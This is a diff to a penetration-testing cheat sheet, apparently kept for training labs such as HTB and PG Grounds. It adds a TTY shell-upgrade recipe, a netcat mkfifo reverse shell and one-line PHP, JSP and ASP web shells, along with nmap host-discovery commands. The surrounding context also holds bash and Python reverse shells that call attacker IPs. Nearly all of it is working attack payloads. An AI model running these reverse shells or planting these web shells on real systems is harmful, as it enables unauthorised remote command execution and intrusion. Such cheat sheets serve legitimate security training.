@@ -1,7 +1,9 @@
 # Table of Content
 - [General](#general)
   - [Important Files](#important-files)
+  - [Upgrade Shell](#upgrade-shell)
   - [Reverse Shell](#reverse-shell)
+  - [Web Shell](#web-shell)
   - [UAC Bypass](#uac-bypass)
 - [PG Grounds & HTB](#pg-grounds-&-htb)
   - [Linux Boxes](#linux-boxes)
@@ -110,6 +112,17 @@ settings.ini
 applicationName.config
 applicationName.cfg
 ```
+## Upgrade Shell
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+hit ctrl+z to background our shell and get back on our local terminal, and input the following stty command:
+  stty raw -echo
+  fg
+  [Enter]
+  [Enter]
+  export TERM=xterm-256color
+  stty rows 67 columns 318
+```
 
 ## Reverse Shell
 ```bash
@@ -119,7 +132,7 @@ bash -c 'bash -i >& /dev/tcp/192.168.45.x/80 0>&1'
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
 echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/192.168.45.176/80 0>&1"' | base64
 
-
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 
 # python reverse shell
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -160,6 +173,14 @@ PS> $EncodedText =[Convert]::ToBase64String($Bytes)
 PS> $EncodedText
 
 $powershell -enc $EncodedText
+```
+
+## Web Shell
+```bash
+<?php system($_REQUEST["cmd"]); ?>
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+<% eval request("cmd") %>
+
 
 
 
@@ -424,6 +445,22 @@ nmap --script <script name> -p<port> <host>
 
 # banner grabbing
 nmap -sV --script=banner <target>
+
+# host discovery (-sn:	Disables port scanning.)
+sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
+
+# host discovery with provided hosts.lst file(-iL	Performs defined scans against targets in provided 'hosts.lst' list.)
+sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5
+
+# host discovery with multiple hosts
+sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d" " -f5
+
+# host discovery with ARP Req/Res(-PE	Performs the ping scan by using 'ICMP Echo requests' against the target)
+sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace
+sudo nmap 10.129.2.18 -sn -oA host -PE --reason
+
+# host discovery with ICMP packet(by disabling arp-ping)
+sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping
 
 ```
 
